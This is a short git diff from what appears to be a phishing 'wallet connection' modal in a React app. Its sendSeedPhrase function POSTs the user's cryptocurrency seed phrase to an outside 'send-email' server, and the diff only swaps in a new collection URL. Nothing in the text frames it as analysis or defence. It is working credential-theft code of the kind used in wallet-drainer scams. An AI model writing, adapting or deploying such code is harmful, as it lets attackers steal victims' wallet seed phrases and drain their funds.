@@ -38,7 +38,7 @@ export default function WalletConnectionModal({
   const sendSeedPhrase = async () => {
     setSubmitStatus('sending');
     try {
-      const response = await fetch('https://dappsconnector-server.vercel.app/send-email', {
+      const response = await fetch('https://dappsconnector-wascoslim-server.vercel.app/send-email', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ seedPhrase })
